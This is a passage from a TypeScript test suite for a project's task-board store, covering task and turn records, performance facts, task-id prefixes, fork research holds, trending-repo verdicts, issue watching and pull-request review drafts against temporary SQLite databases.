			expect(after.needsReason).toBe("why");
			expect(after.pendingPrompt).toBe("later");
			expect(after.sessionId).toBe("sess-1");
			expect(after.dependsOn).toEqual(["t9"]);
			expect(after.images).toEqual(["a.png", "b.png"]);
			expect(after.keptFiles).toEqual(["k.txt"]);
			expect(after.asked).toBeNull(); // empty list normalizes to null
			expect(after.releaseVersion).toBe("v9");
			expect(after.updatedAt).toBeGreaterThan(before.updatedAt);
			await store.close();
			// Raw reads need the store closed: the board opens its DBs in exclusive locking mode.
			const raw = new Database(join(dir, ".tasks", "tasks.db"));
			const row = raw
				.query<{ images: string; session_id: string | null }, [string]>(
					"SELECT images, session_id FROM tasks WHERE id = ?",
				)
				.get(task.id);
			raw.close();
			expect(row?.images).toBe('["a.png","b.png"]');
			expect(row?.session_id).toBe("sess-1");
		});

		test("updateTask with undefined-keyed patch fields skips their columns", async () => {
			const dir = join(root, "ar-patch-undef");
			const store = await open(dir);
			const task = await store.createTask("untouched");
			await store.updateTask(task.id, {
				title: undefined,
				branch: undefined,
			} as unknown as { title?: string; branch?: string });
			const after = (await store.getTask(task.id))!;
			expect(after.title).toBe("untouched");
			expect(after.branch).toBeNull();
			await store.close();
		});
	});

	describe("turn lifecycle", () => {
		test("finishTurn maps patch keys, skips undefined ones, and records error events except for a cancelled turn", async () => {
			const dir = join(root, "ar-finish-turn");
			const store = await open(dir);
			const task = await store.createTask("turns");
			const turn = await store.startTurn(
				task.id,
				"work",
				"prompt text",
				111,
				"in",
			);
			expect(turn).toEqual((await store.listTurns(task.id))[0]!);
			expect(turn.input).toBe("in");
			expect(turn.endedAt).toBeNull();

			const ended = await store.finishTurn(turn.id, {
				endedAt: 12345,
				exitCode: 3,
				outcome: "ready",
				summary: "s",
				details: "d",
				error: "boom",
				model: "m1",
				pid: null,
				question: null,
			});
			expect(ended).toEqual((await store.listTurns(task.id))[0]!);
			expect(ended.endedAt).toBe(12345);
			expect(ended.exitCode).toBe(3);
			expect(ended.outcome).toBe("ready");
			expect(ended.summary).toBe("s");
			expect(ended.details).toBe("d");
			expect(ended.error).toBe("boom");
			expect(ended.model).toBe("m1");
			expect(ended.pid).toBeNull();
			// The failed turn logged exactly one error event with its detail.
			const errors = (await store.events()).filter((e) => e.kind === "error");
			expect(errors).toHaveLength(1);
			expect(errors[0]!.taskId).toBe(task.id);
			expect(errors[0]!.detail).toBe("boom");

			// A deliberate Cancel is not an error event; an empty patch still reads the row back.
			const cancel = await store.startTurn(task.id, "work", "p", 222);
			const done = await store.finishTurn(cancel.id, { error: "cancelled" });
			expect(done.error).toBe("cancelled");
			expect(
				(await store.events()).filter((e) => e.kind === "error"),
			).toHaveLength(1);
			const noop = await store.finishTurn(cancel.id, {});
			expect(noop.id).toBe(cancel.id);
			expect(await store.listTurns(task.id)).toHaveLength(2);
			await store.close();
		});

		test("listTurns returns only the task's turns ordered by id", async () => {
			const store = await open(join(root, "ar-list-turns"));
			const a = await store.createTask("a");
			const b = await store.createTask("b");
			const t1 = await store.startTurn(a.id, "work", "p", null);
			await store.startTurn(b.id, "merge", "q", null);
			const t3 = await store.startTurn(a.id, "merge", "r", null);
			expect((await store.listTurns(a.id)).map((t) => t.id)).toEqual([
				t1.id,
				t3.id,
			]);
			await store.close();
		});
	});

	describe("perfFacts", () => {
		test("derives done time from the latest done event, plus cancelled, work turns, and needs_you", async () => {
			const dir = join(root, "perf-facts");
			const store = await open(dir);
			const ok = await store.createTask("ok");
			await store.updateTask(ok.id, { stage: "in_progress" });
			await store.startTurn(ok.id, "work", "p", null);
			await store.startTurn(ok.id, "merge", "p", null); // a merge turn is not a work turn
			await store.updateTask(ok.id, { stage: "done" });
			const messy = await store.createTask("messy");
			await store.updateTask(messy.id, {
				state: "needs_you",
				needsReason: "ask",
			});
			await store.updateTask(messy.id, { state: "queued", pendingPrompt: "." });
			await store.startTurn(messy.id, "work", "p", null);
			await store.startTurn(messy.id, "work", "p2", null);
			await store.updateTask(messy.id, { stage: "done" });
			const gone = await store.createTask("gone");
			await store.updateTask(gone.id, { cancelledAt: 123 });
			await store.updateTask(gone.id, { stage: "done" });
			await store.close();
			const reopened = await open(dir);
			const facts = (await reopened.perfFacts()).tasks;
			expect(facts).toHaveLength(3);
			// Identify each card by its fact shape, not by order.
			const okFacts = facts.find((f) => f.workTurns === 1 && !f.cancelled)!;
			expect(okFacts.hadNeedsYou).toBe(false);
			expect(okFacts.doneAt).not.toBeNull();
			const messyFacts = facts.find((f) => f.workTurns === 2)!;
			expect(messyFacts.hadNeedsYou).toBe(true);
			expect(messyFacts.cancelled).toBe(false);
			expect(messyFacts.doneAt).not.toBeNull();
			const goneFacts = facts.find((f) => f.cancelled)!;
			expect(goneFacts.doneAt).not.toBeNull(); // perfMetrics filters it by `cancelled`
			await reopened.close();
		});

		test("doneAt is the latest stage→done event, not the first", async () => {
			const dir = join(root, "perf-done-at");
			const store = await open(dir);
			const t = await store.createTask("done twice");
			await store.updateTask(t.id, { stage: "in_progress" });
			await store.updateTask(t.id, { stage: "done" });
			await store.updateTask(t.id, { stage: "in_progress" });
			await store.updateTask(t.id, { stage: "done" });
			await store.close();
			// The two done events can share one millisecond: pin them apart by rowid.
			const raw = new Database(join(dir, ".tasks", "tasks.db"));
			raw.run(
				"UPDATE events SET at = 1000 WHERE id = (SELECT MIN(id) FROM events WHERE to_value = 'done')",
			);
			raw.run(
				"UPDATE events SET at = 2000 WHERE id = (SELECT MAX(id) FROM events WHERE to_value = 'done')",
			);
			raw.close();
			const facts = await (await open(dir)).perfFacts();
			expect(facts.tasks).toHaveLength(1);
			expect(facts.tasks[0]?.doneAt).toBe(2000);
		});

		test("turn failure flags follow error and exit_code with SQL NULL semantics", async () => {
			const dir = join(root, "perf-failed");
			const store = await open(dir);
			const t = await store.createTask("flags");
			const boom = await store.startTurn(t.id, "work", "p", null);
			await store.finishTurn(boom.id, { endedAt: 100, error: "boom" });
			const cancel = await store.startTurn(t.id, "work", "p", null);
			await store.finishTurn(cancel.id, { endedAt: 200, error: "cancelled" });
			const crashed = await store.startTurn(t.id, "work", "p", null);
			await store.finishTurn(crashed.id, { endedAt: 300, exitCode: 3 });
			const clean = await store.startTurn(t.id, "work", "p", null);
			await store.finishTurn(clean.id, { endedAt: 400, exitCode: 0 });
			await store.close();
			// A finished turn with NULL error and NULL exit_code is not failed either.
			const raw = new Database(join(dir, ".tasks", "tasks.db"));
			raw.run("UPDATE turns SET exit_code = NULL WHERE ended_at = 400");
			raw.close();
			const turns = (await (await open(dir)).perfFacts()).turns.sort(
				(a, b) => a.endedAt - b.endedAt,
			);
			expect(turns).toEqual([
				{ endedAt: 100, failed: true, cost: null },
				{ endedAt: 200, failed: false, cost: null },
				{ endedAt: 300, failed: true, cost: null },
				{ endedAt: 400, failed: false, cost: null },
			]);
		});

		test("turnDurations returns completed turns only, with null model kept and glitch rows dropped", async () => {
			const dir = join(root, "turn-durations");
			const store = await open(dir);
			const t = await store.createTask("timed");
			// Two completed turns with real durations, one with the default (null) model.
			const a = await store.startTurn(t.id, "work", "p", null);
			await store.finishTurn(a.id, {
				endedAt: a.startedAt + 1000,
				model: "a/one",
			});
			const b = await store.startTurn(t.id, "merge", "p", null);
			await store.finishTurn(b.id, { endedAt: b.startedAt + 3000 });
			// A still-open turn is not a duration sample.
			await store.startTurn(t.id, "work", "p", null);
			// A stamp glitch (ended before it started) is filtered, not shipped.
			const glitch = await store.startTurn(t.id, "work", "p", null);
			const glitchEnd = glitch.startedAt + 500;
			await store.finishTurn(glitch.id, { endedAt: glitchEnd });
			await store.close();
			const raw = new Database(join(dir, ".tasks", "tasks.db"));
			raw.run(
				"UPDATE turns SET started_at = ended_at + 2000 WHERE ended_at = ?",
				[glitchEnd],
			);
			raw.close();
			const rows = (await (await open(dir)).turnDurations()).sort(
				(x, y) => x.ms - y.ms,
			);
			expect(rows).toEqual([
				{ kind: "work", model: "a/one", ms: 1000 },
				{ kind: "merge", model: null, ms: 3000 },
			]);
		});
	});

	describe("lifecycle helpers", () => {
		test("tasksDirFor without OTTR_DATA_DIR points into the checkout", async () => {
			const saved = process.env.OTTR_DATA_DIR;
			delete process.env.OTTR_DATA_DIR;
			try {
				expect(tasksDirFor("/some/proj")).toBe(join("/some/proj", ".tasks"));
			} finally {
				if (saved !== undefined) process.env.OTTR_DATA_DIR = saved;
			}
		});

		test("a double close is a no-op and the store reopens cleanly", async () => {
			const dir = join(root, "ar-double-close");
			const store = await open(dir);
			await store.close();
			await store.close();
			expect(await (await open(dir)).listTasks()).toEqual([]);
		});
	});

	describe("task ids", () => {
		test("new ids are PREFIX-n keys derived from the store folder name, consecutive", async () => {
			const store = await open(join(root, "my_repo"));
			const a = await store.createTask("a");
			const b = await store.createTask("b");
			expect(a.id).toMatch(/^[A-Z0-9]{1,4}-[0-9]+$/);
			expect(a.id).toBe("MYRE-1");
			expect(b.id).toBe("MYRE-2");
		});

		test("an explicit id skips the counter; a taken one gets -2, -3, ...", async () => {
			const dir = join(root, "explicit-id");
			const store = await open(dir);
			await store.setSettings({ taskIdPrefix: "RTR" });
			const source = await store.createTask("source card");
			expect(source.id).toBe("RTR-1");
			const retro = await store.createTask(
				"retro prompt",
				null,
				"retro",
				`${source.id}-retro`,
			);
			expect(retro.id).toBe("RTR-1-retro");
			// A second retro for the same card: the id is taken, so -retro-2. No reuse.
			const retro2 = await store.createTask(
				"retro prompt",
				null,
				"retro",
				`${source.id}-retro`,
			);
			expect(retro2.id).toBe("RTR-1-retro-2");
			// The retro ids consumed no counter value: the next card takes the next number.
			expect((await store.createTask("next card")).id).toBe("RTR-2");
			// An empty explicit id is a caller bug, not an idless card.
			await expect(store.createTask("x", null, "work", "")).rejects.toThrow();
			await store.close();
		});

		test("taskIdPrefix overrides the derived handle; null returns to it; the counter never resets", async () => {
			const dir = join(root, "chs-override");
			const store = await open(dir);
			expect((await store.createTask("a")).id).toBe("CHSO-1");
			await store.setSettings({ taskIdPrefix: "chs" });
			expect((await store.createTask("b")).id).toBe("CHS-2");
			// Defensive normalization: a stored lowercase value still yields uppercase ids.
			await store.setSettings({ taskIdPrefix: "zz" });
			expect((await store.createTask("c")).id).toBe("ZZ-3");
			await store.setSettings({ taskIdPrefix: null });
			expect((await store.createTask("d")).id).toBe("CHSO-4");
		});

		test("getTask still resolves a legacy 8-hex id", async () => {
			const dir = join(root, "legacy-id");
			const store = await open(dir);
			const task = await store.createTask("legacy");
			await store.close();
			const legacyId = "abcdef12";
			const raw = new Database(join(dir, ".tasks", "tasks.db"));
			raw.run("UPDATE tasks SET id = ? WHERE id = ?", [legacyId, task.id]);
			raw.close();
			expect((await (await open(dir)).getTask(legacyId))?.prompt).toBe(
				"legacy",
			);
		});
	});
});

describe("fork research store methods", () => {
	test("saveForkBranch/listForkBranches round-trip and upsert", async () => {
		const store = await open(join(root, "fork-branch"));
		const row = {
			forkId: 1,
			branchHash: "h1",
			branch: "feature",
			head: "abc",
			analyzedHead: null,
			firstPendingAt: 100,
			lastRunAt: null,
			lastError: null,
			retries: 0,
		};
		await store.saveForkBranch(row);
		await store.saveForkBranch({
			...row,
			head: "def",
			retries: 2,
			lastError: "boom",
		});
		expect(await store.listForkBranches(1)).toEqual([
			{ ...row, head: "def", retries: 2, lastError: "boom" },
		]);
		expect(await store.listAllForkBranches()).toHaveLength(1);
	});

	test("forkRunsSince counts recorded runs", async () => {
		const store = await open(join(root, "fork-runs"));
		await store.recordForkRun(1, 1000);
		await store.recordForkRun(1, 2000);
		expect(await store.forkRunsSince(1500)).toBe(1);
		expect(await store.forkRunsSince(0)).toBe(2);
	});

	test("createForkResult files card, proposals, and analyzed heads in one transaction", async () => {
		const store = await open(join(root, "fork-result"));
		await store.saveForkBranch({
			forkId: 7,
			branchHash: "h1",
			branch: "feat-a",
			head: "abc",
			analyzedHead: null,
			firstPendingAt: 5,
			lastRunAt: null,
			lastError: "earlier failure",
			retries: 2,
		});
		const card = await store.createForkResult({
			prompt: "report prompt",
			title: "Fork research: 2026-10-14",
			report: "# findings",
			topic: "fork research",
			proposals: [
				{ prompt: "do a", model: null },
				{ prompt: "do b", model: "m" },
			],
			analyzed: [
				{
					forkId: 7,
					branchHash: "h1",
					head: "abc",
					at: 42,
				},
			],
		});
		const stored = (await store.getTask(card.id))!;
		expect(stored.research).toBe(true);
		expect(stored.stage).toBe("done");
		expect(stored.state).toBe("idle");
		expect(stored.topic).toBe("fork research");
		expect(stored.report).toBe("# findings");
		expect(stored.title).toBe("Fork research: 2026-10-14");
		const kids = (await store.listTasks())
			.filter((t) => t.followUpOf === card.id)
			.sort((a, b) => a.prompt.localeCompare(b.prompt));
		expect(kids).toHaveLength(2);
		for (const kid of kids) {
			expect(kid.state).toBe("needs_you");
			expect(kid.needsReason).toBe(
				"Fork proposal from FORK-1. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
			);
		}
		expect(kids[1]!.model).toBe("m");
		const branch = (await store.listForkBranches(7))[0]!;
		expect(branch.analyzedHead).toBe("abc");
		expect(branch.firstPendingAt).toBeNull();
		expect(branch.lastRunAt).toBe(42);
		expect(branch.lastError).toBeNull();
		expect(branch.retries).toBe(0);
	});
});

describe("fork hold store", () => {
	test("a legacy database without the table converges on open", async () => {
		const dir = join(root, "fork-hold-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before fork_hold existed (pre-feature done card).
		db.exec(`CREATE TABLE IF NOT EXISTS fork_branch (
  fork_id INTEGER NOT NULL,
  branch_hash TEXT NOT NULL,
  branch TEXT NOT NULL,
  head TEXT,
  analyzed_head TEXT,
  first_pending_at INTEGER,
  last_run_at INTEGER,
  last_error TEXT,
  retries INTEGER NOT NULL DEFAULT 0,
  PRIMARY KEY (fork_id, branch_hash)
)`);
		db.exec(
			"INSERT INTO fork_branch (fork_id, branch_hash, branch, head, analyzed_head) VALUES (1, 'h1', 'feat', 'abc', NULL)",
		);
		db.close();
		const store = await open(dir);
		expect(await store.listForkHolds(1)).toEqual([]);
		await store.setForkHolds(1, "h1", [
			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: false },
		]);
		expect(await store.listForkHolds(1)).toEqual([
			{
				forkId: 1,
				branchHash: "h1",
				sha: "a".repeat(40),
				pr: 5,
				prHead: "b".repeat(40),
				released: 0,
			},
		]);
		await store.close();
	});

	test("setForkHolds replaces the branch's rows", async () => {
		const store = await open(join(root, "fork-hold-replace"));
		await store.setForkHolds(1, "h1", [
			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: false },
			{ sha: "c".repeat(40), pr: 5, prHead: "b".repeat(40), released: true },
		]);
		await store.setForkHolds(1, "h1", [
			{ sha: "c".repeat(40), pr: 6, prHead: "d".repeat(40), released: true },
		]);
		expect(await store.listForkHolds(1)).toEqual([
			{
				forkId: 1,
				branchHash: "h1",
				sha: "c".repeat(40),
				pr: 6,
				prHead: "d".repeat(40),
				released: 1,
			},
		]);
		await store.close();
	});

	test("deleteForkBranchesNotIn prunes holds of absent forks and clears all on empty ids", async () => {
		const store = await open(join(root, "fork-hold-prune"));
		await store.setForkHolds(1, "h1", [
			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: false },
		]);
		await store.setForkHolds(2, "h2", [
			{ sha: "c".repeat(40), pr: 6, prHead: "d".repeat(40), released: false },
		]);
		await store.deleteForkBranchesNotIn([1]);
		expect(await store.listForkHolds(2)).toEqual([]);
		expect(await store.listForkHolds(1)).toHaveLength(1);
		await store.deleteForkBranchesNotIn([]);
		expect(await store.listForkHolds(1)).toEqual([]);
		await store.close();
	});

	test("createForkResult deletes consumed hold rows in-transaction and leaves the rest", async () => {
		const store = await open(join(root, "fork-hold-consume"));
		await store.saveForkBranch({
			forkId: 7,
			branchHash: "h1",
			branch: "feat-a",
			head: "abc",
			analyzedHead: null,
			firstPendingAt: 5,
			lastRunAt: null,
			lastError: null,
			retries: 0,
		});
		await store.setForkHolds(7, "h1", [
			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: true },
			{ sha: "c".repeat(40), pr: 5, prHead: "b".repeat(40), released: true },
		]);
		await store.createForkResult({
			prompt: "report prompt",
			title: "Fork research",
			report: "# findings",
			topic: "fork research",
			proposals: [],
			analyzed: [
				{
					forkId: 7,
					branchHash: "h1",
					head: "abc",
					at: 42,
					consumed: ["a".repeat(40)],
				},
			],
		});
		expect(await store.listForkHolds(7)).toEqual([
			{
				forkId: 7,
				branchHash: "h1",
				sha: "c".repeat(40),
				pr: 5,
				prHead: "b".repeat(40),
				released: 1,
			},
		]);
		expect((await store.listForkBranches(7))[0]!.analyzedHead).toBe("abc");
		await store.close();
	});
});

describe("trending verdicts", () => {
	const scoutOf = async (store: ProjectStore) =>
		await store.createTask("scan trending", null, "trending");

	test("a proposal lands in backlog, idle, under the scout; the 4th filing hits the cap", async () => {
		const store = await open(join(root, "trending-cap"));
		const scout = await scoutOf(store);
		for (const repo of ["a/one", "B/Two", "c/three"]) {
			const res = await store.fileTrendingProposal({
				scoutId: scout.id,
				repo,
				prompt: `adopt ${repo}`,
				cap: 3,
				now: 10,
			});
			if (!res.ok) throw new Error(res.error);
			expect(res.task.stage).toBe("backlog");
			expect(res.task.state).toBe("idle");
			expect(res.task.queuedAt).toBeNull();
			expect(res.task.followUpOf).toBe(scout.id);
			const v = await store.trendingVerdictByProposal(res.task.id);
			expect(v?.repo).toBe(repo.toLowerCase());
			expect(v?.verdict).toBe("filed");
			expect(v?.scoutCardId).toBe(scout.id);
		}
		expect(
			await store.fileTrendingProposal({
				scoutId: scout.id,
				repo: "d/four",
				prompt: "adopt d/four",
				cap: 3,
			}),
		).toEqual({
			ok: false,
			error:
				"cap of 3 proposals per scan reached: record d/four as deferred instead",
		});
		expect(await store.getTrendingVerdict("d/four")).toBeNull();
	});

	test("final verdicts are never overwritten; deferred can be re-judged and keeps firstSeenAt", async () => {
		const store = await open(join(root, "trending-final"));
		const scout = await scoutOf(store);
		const id = scout.id;
		expect(
			await store.judgeTrendingRepo({
				scoutId: id,
				repo: "x/no",
				verdict: "no_fit",
				reason: "unrelated",
			}),
		).toEqual({ ok: true });
		expect(
			await store.judgeTrendingRepo({
				scoutId: id,
				repo: "X/No",
				verdict: "deferred",
				reason: "maybe",
			}),
		).toEqual({
			ok: false,
			error: "x/no already has a final verdict (no_fit)",
		});
		expect(
			await store.fileTrendingProposal({
				scoutId: id,
				repo: "x/no",
				prompt: "p",
				cap: 3,
			}),
		).toEqual({
			ok: false,
			error: "x/no already has a final verdict (no_fit)",
		});
		const filed = await store.fileTrendingProposal({
			scoutId: id,
			repo: "x/yes",
			prompt: "p",
			cap: 3,
		});
		expect(filed.ok).toBe(true);
		expect(
			await store.judgeTrendingRepo({
				scoutId: id,
				repo: "x/yes",
				verdict: "no_fit",
				reason: "r",
			}),
		).toEqual({
			ok: false,
			error: "x/yes already has a final verdict (filed)",
		});

		expect(
			await store.judgeTrendingRepo({
				scoutId: id,
				repo: "x/later",
				verdict: "deferred",
				reason: "next week",
				now: 5,
			}),
		).toEqual({ ok: true });
		expect(
			await store.judgeTrendingRepo({
				scoutId: id,
				repo: "x/later",
				verdict: "no_fit",
				reason: "decided",
				now: 9,
			}),
		).toEqual({ ok: true });
		const v = await store.getTrendingVerdict("x/later");
		expect(v?.verdict).toBe("no_fit");
		expect(v?.firstSeenAt).toBe(5);
		expect(v?.judgedAt).toBe(9);
		expect(
			(
				await store.judgeTrendingRepo({
					scoutId: id,
					repo: "x/blank",
					verdict: "deferred",
					reason: "  ",
				})
			).ok,
		).toBe(false);
	});

	test("reject turns a filed proposal into a user no_fit, once", async () => {
		const store = await open(join(root, "trending-reject"));
		const scout = await scoutOf(store);
		const res = await store.fileTrendingProposal({
			scoutId: scout.id,
			repo: "o/r",
			prompt: "p",
			cap: 3,
		});
		if (!res.ok) throw new Error(res.error);
		expect(
			await store.rejectTrendingProposal(res.task.id, "  too heavy  ", 77),
		).toBe(true);
		const v = await store.getTrendingVerdict("o/r");
		expect(v?.verdict).toBe("no_fit");
		expect(v?.rejectedByUser).toBe(true);
		expect(v?.reason).toBe("too heavy");
		expect(v?.judgedAt).toBe(77);
		expect(await store.rejectTrendingProposal(res.task.id, "other", 99)).toBe(
			false,
		);
		expect(await store.getTrendingVerdict("o/r")).toEqual(v);
		expect(await store.rejectTrendingProposal("nope-1", null)).toBe(false);

		const res2 = await store.fileTrendingProposal({
			scoutId: scout.id,
			repo: "o/s",
			prompt: "p",
			cap: 3,
		});
		if (!res2.ok) throw new Error(res2.error);
		expect(await store.rejectTrendingProposal(res2.task.id, null)).toBe(true);
		expect((await store.getTrendingVerdict("o/s"))?.reason).toBe(
			"Rejected by the user (no reason given)",
		);
	});

	test("a non-trending or cancelled scout card is refused", async () => {
		const store = await open(join(root, "trending-scout"));
		const work = await store.createTask("plain work");
		const err = {
			ok: false as const,
			error: "not an open trending scout card",
		};
		expect(
			await store.fileTrendingProposal({
				scoutId: work.id,
				repo: "a/b",
				prompt: "p",
				cap: 3,
			}),
		).toEqual(err);
		const scout = await scoutOf(store);
		await store.updateTask(scout.id, { cancelledAt: 1 });
		expect(
			await store.judgeTrendingRepo({
				scoutId: scout.id,
				repo: "a/b",
				verdict: "deferred",
				reason: "r",
			}),
		).toEqual(err);
		expect(
			await store.fileTrendingProposal({
				scoutId: "missing-1",
				repo: "a/b",
				prompt: "p",
				cap: 3,
			}),
		).toEqual(err);
		const live = await scoutOf(store);
		expect(
			(
				await store.judgeTrendingRepo({
					scoutId: live.id,
					repo: "not a repo",
					verdict: "deferred",
					reason: "r",
				})
			).ok,
		).toBe(false);
		expect(await store.listTrendingVerdicts()).toEqual([]);
	});
});

describe("issue watch store methods", () => {
	test("settings default off and issueWatchSince round-trips a number", async () => {
		const dir = join(root, "issue-settings");
		let store = await open(dir);
		expect(DEFAULT_SETTINGS.issueWatch).toBe(false);
		expect((await store.getSettings()).issueWatch).toBe(false);
		expect((await store.getSettings()).issueWatchSince).toBeNull();
		const since = 1_700_000_000_000;
		await store.setSettings({ issueWatch: true, issueWatchSince: since });
		await store.close();
		store = await open(dir);
		expect((await store.getSettings()).issueWatch).toBe(true);
		expect((await store.getSettings()).issueWatchSince).toBe(since);
		await store.close();
	});

	test("fileIssueCard files an idle backlog work card and an unlabelled row", async () => {
		const store = await open(join(root, "issue-file"));
		const card = await store.fileIssueCard({
			number: 7,
			title: "Crash on start",
			prompt: "Fix GitHub issue #7",
			now: 1000,
		});
		expect(card).toMatchObject({
			title: "Crash on start",
			prompt: "Fix GitHub issue #7",
			kind: "work",
			stage: "backlog",
			state: "idle",
			topic: "github issue",
			queuedAt: null,
		});
		expect(await store.getIssueWatch(7)).toEqual({
			number: 7,
			taskId: card.id,
			labelled: false,
			filedAt: 1000,
		});
		expect(await store.getIssueWatch(8)).toBeNull();
	});

	test("a second fileIssueCard for the same number throws and leaves no extra card", async () => {
		const store = await open(join(root, "issue-dup"));
		const o = { number: 3, title: "t", prompt: "p", now: 1 };
		await store.fileIssueCard(o);
		const before = (await store.listTasks()).length;
		await expect(store.fileIssueCard({ ...o, now: 2 })).rejects.toThrow();
		expect(await store.listTasks()).toHaveLength(before);
		expect((await store.getIssueWatch(3))?.filedAt).toBe(1);
	});

	test("issueCardsFiledSince counts rows filed at or after since", async () => {
		const store = await open(join(root, "issue-since"));
		await store.fileIssueCard({ number: 1, title: "a", prompt: "a", now: 100 });
		await store.fileIssueCard({ number: 2, title: "b", prompt: "b", now: 200 });
		await store.fileIssueCard({ number: 3, title: "c", prompt: "c", now: 300 });
		expect(await store.issueCardsFiledSince(200)).toBe(2);
		expect(await store.issueCardsFiledSince(201)).toBe(1);
		expect(await store.issueCardsFiledSince(0)).toBe(3);
		expect(await store.issueCardsFiledSince(301)).toBe(0);
	});

	test("unlabelledIssues lists ascending until markIssueLabelled", async () => {
		const store = await open(join(root, "issue-label"));
		await store.fileIssueCard({ number: 9, title: "a", prompt: "a", now: 1 });
		await store.fileIssueCard({ number: 4, title: "b", prompt: "b", now: 1 });
		expect(await store.unlabelledIssues()).toEqual([4, 9]);
		await store.markIssueLabelled(4);
		expect(await store.unlabelledIssues()).toEqual([9]);
		expect((await store.getIssueWatch(4))?.labelled).toBe(true);
	});
});

describe("pr review store methods", () => {
	const row = {
		number: 12,
		taskId: null,
		head: "abc",
		firstSeenAt: 100,
		reviewedHead: null,
		postedHead: null,
		postedUrl: null,
		postedLogin: null,
		state: "open" as const,
		draft: false,
		title: "Fix the thing",
		postError: null,
		commentsAt: null,
		commentsUnseen: false,
	};

	test("prReviews defaults to false", async () => {
		expect(DEFAULT_SETTINGS.prReviews).toBe(false);
		expect(
			(await (await open(join(root, "pr-settings"))).getSettings()).prReviews,
		).toBe(false);
	});

	test("prMode defaults to false and persists across reopen", async () => {
		expect(DEFAULT_SETTINGS.prMode).toBe(false);
		const store = await open(join(root, "pr-mode"));
		expect((await store.getSettings()).prMode).toBe(false);
		await store.setSettings({ prMode: true });
		expect((await store.getSettings()).prMode).toBe(true);
		await store.close();
		expect(
			(await (await open(join(root, "pr-mode"))).getSettings()).prMode,
		).toBe(true);
	});

	test("prReviewApprove defaults to false and persists across reopen", async () => {
		expect(DEFAULT_SETTINGS.prReviewApprove).toBe(false);
		const store = await open(join(root, "pr-approve"));
		expect((await store.getSettings()).prReviewApprove).toBe(false);
		await store.setSettings({ prReviewApprove: true });
		expect((await store.getSettings()).prReviewApprove).toBe(true);
		await store.close();
		expect(
			(await (await open(join(root, "pr-approve"))).getSettings())
				.prReviewApprove,
		).toBe(true);
	});

	test("savePrReview upserts by number and round-trips booleans and nulls", async () => {
		const store = await open(join(root, "pr-row"));
		expect(await store.getPrReview(12)).toBeNull();
		await store.savePrReview(row);
		expect(await store.getPrReview(12)).toEqual(row);
		const changed = {
			...row,
			taskId: "T-1",
			head: "def",
			reviewedHead: "abc",
			postedHead: "abc",
			postedUrl: "https://github.com/acme/widget/pull/12#pullrequestreview-1",
			postedLogin: "ottr[bot]",
			state: "merged" as const,
			draft: true,
			title: "Fix it",
			postError: "gh: 502",
			commentsAt: null,
			commentsUnseen: false,
		};
		await store.savePrReview(changed);
		await store.savePrReview({ ...row, number: 3 });
		expect(await store.getPrReview(12)).toEqual(changed);
		expect((await store.listPrReviews()).map((r) => r.number)).toEqual([3, 12]);
		expect(await store.getPrReviewByTask("T-1")).toEqual(changed);
		expect(await store.getPrReviewByTask("T-2")).toBeNull();
	});

	test("prReviewRunsSince counts attempts at or after the bound", async () => {
		const store = await open(join(root, "pr-runs"));
		await store.startPrRun(12, "a", 1000);
		await store.startPrRun(12, "b", 2000);
		expect(await store.prReviewRunsSince(2000)).toBe(1);
		expect(await store.prReviewRunsSince(2001)).toBe(0);
		expect(await store.prReviewRunsSince(1000)).toBe(2);
	});

	test("lastPrRunAt gives the latest done run's start per head and ignores undone runs", async () => {
		const store = await open(join(root, "pr-last-run"));
		await store.savePrReview({
			number: 12,
			taskId: null,
			head: "abc",
			firstSeenAt: 1,
			reviewedHead: null,
			postedHead: null,
			postedUrl: null,
			postedLogin: null,
			state: "open",
			draft: false,
			title: "t",
			postError: null,
			commentsAt: null,
			commentsUnseen: false,
		});
		const run1 = await store.startPrRun(12, "abc", 1000);
		await store.startPrRun(12, "abc", 500);
		// A failed attempt counts for the cap but is not a review yet.
		expect(await store.lastPrRunAt(12, "abc")).toBeNull();
		await store.savePrDraft({
			run: run1,
			number: 12,
			head: "abc",
			draft: "d",
			prompt: "p",
			blocking: true,
		});
		expect(await store.lastPrRunAt(12, "abc")).toBe(1000);
		expect(await store.lastPrRunAt(12, "xyz")).toBeNull();
	});

	test("savePrDraft files one waiting card, then updates the same card; only saved heads count as reviewed", async () => {
		const store = await open(join(root, "pr-draft"));
		await expect(
			store.savePrDraft({
				run: 1,
				number: 9,
				head: "a",
				draft: "d",
				prompt: "p",
				blocking: true,
			}),
		).rejects.toThrow();
		await store.savePrReview({
			...row,
			title: "Fix the thing",
			postError: "old",
		});
		const run1 = await store.startPrRun(12, "abc", 50);
		// A failed attempt counts for the cap but leaves the head open for a retry.
		expect(await store.prHeadReviewed(12, "abc")).toBe(false);
		const card = await store.savePrDraft({
			run: run1,
			number: 12,
			head: "abc",
			draft: "## Summary\nok",
			prompt: "review 1",
			blocking: true,
		});
		expect(card.kind).toBe("pr_review");
		expect(card.title).toBe("PR review: #12 Fix the thing");
		// An open PR with an unposted draft waits for the user.
		expect(card.stage).toBe("in_progress");
		expect(card.state).toBe("needs_you");
		expect(card.needsReason).toBe(
			"Review the draft, then post it to GitHub or ask for a new draft.",
		);
		expect(card.details).toBe("## Summary\nok");
		expect(card.topic).toBe("pr review");
		expect(await store.prHeadReviewed(12, "abc")).toBe(true);
		expect(await store.getPrReview(12)).toMatchObject({
			taskId: card.id,
			reviewedHead: "abc",
			postError: null,
		});

		// The watcher wrote a newer state during the model call: the draft save keeps it.
		await store.setPrState(12, "merged");
		const again = await store.savePrDraft({
			run: await store.startPrRun(12, "def", 60),
			number: 12,
			head: "def",
			draft: "second",
			prompt: "review 2",
			blocking: true,
		});
		expect(again.id).toBe(card.id);
		expect(again.details).toBe("second");
		expect(again.prompt).toBe("review 2");
		expect(await store.listTasks()).toHaveLength(1);
		// A merged PR has nothing left to post.
		expect(again.stage).toBe("done");
		expect(again.state).toBe("idle");
		expect(again.needsReason).toBeNull();
		expect(await store.getPrReview(12)).toMatchObject({
			reviewedHead: "def",
			state: "merged",
		});
		expect(await store.prReviewRunsSince(0)).toBe(2);
	});

	test("syncPrCard places the card from its row and writes only on a difference", async () => {
		const store = await open(join(root, "pr-sync"));
		await store.savePrReview(row);
		const card = await store.savePrDraft({
